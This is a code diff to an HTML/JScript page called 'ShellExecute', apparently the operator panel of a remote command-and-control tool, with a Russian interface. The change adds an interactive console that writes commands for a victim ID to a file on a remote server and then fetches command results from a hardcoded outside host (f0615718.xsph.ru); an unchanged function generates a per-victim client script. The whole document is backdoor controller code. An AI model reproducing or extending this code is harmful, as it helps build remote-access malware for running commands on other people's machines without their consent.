@@ -8,7 +8,7 @@
 		color: black;
 		cursor: default;
 		padding: 2px;
-		font: 16px Arial;
+		font: 18px Arial;
 	}
   </style>
   <title>ShellExecute</title>
@@ -22,13 +22,17 @@
   contextmenu=no
   navigable=yes />
   <script src="wscript.js"></script>
-  <script>resize(500, 400)</script>
+  <script>resize(800, 400)</script>
 </head>
 <body>
 	<h2>ShellExecute</h2>
-	Ваш ID: <input type="text" size=45 id="id"><br>
-	<button onclick="mkpayload()">Создать скрипт</button>
-	<button style="float: right;" onclick="enteraddr()">Задать команду</button>
+	Ваш ID: <input type="text" size=45 id="id">
+	<button onclick="mkpayload()" id="mkpl" tabindex="-1" style="float: right">Создать скрипт</button><hr>
+	<div style="display: block; width: 100%; height: 30%; border: solid 1px black;">
+		Консоль<br><br>
+		<div id="console"></div>
+		&gt; <input type="text" size="78%" id="cmd">
+	</div><br>
 	<script>
 		var fs = WScript.CreateObject("Scripting.FileSystemObject");
 		var shell = WScript.CreateObject("WScript.Shell");
@@ -51,14 +55,29 @@
 			WScript.Echo("Файл " + "client" + id.value + ".js" + " создан.");
 		}
 		
-		function enteraddr(){
-			var addr = prompt("Введите команду для выполнения:", "null");
-			sendtext(id.value + ".txt", addr);
-			WScript.Echo("Команда отправлена. Она будет выполнена в течении 1 - 10 сек.");
+		cmd.focus();
+		
+		cmd.onkeypress = function(e){
+			if(e.key != "Enter") return;
+			
+			mkpl.disabled = true;
+			
+			console.innerHTML += "> " + cmd.value + "<br>";
+			
+			sendtext(id.value + ".txt", cmd.value);
+			cmd.disabled = true;
 			setTimeout(function(){
 				sendtext(id.value + ".txt", "null");
-				WScript.Echo("Команда выполнена.");
+				var xmlhttp = WScript.CreateObject("Microsoft.XMLHTTP");
+				xmlhttp.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/" + id.value + ".result.txt", false);
+				xmlhttp.Send();
+				
+				console.innerHTML += "< " + xmlhttp.responseText + "<br>";
+				cmd.disabled = false;
 			}, 10000);
+
+			cmd.value = "";
+			cmd.focus();
 		}
 	</script>
 </body>
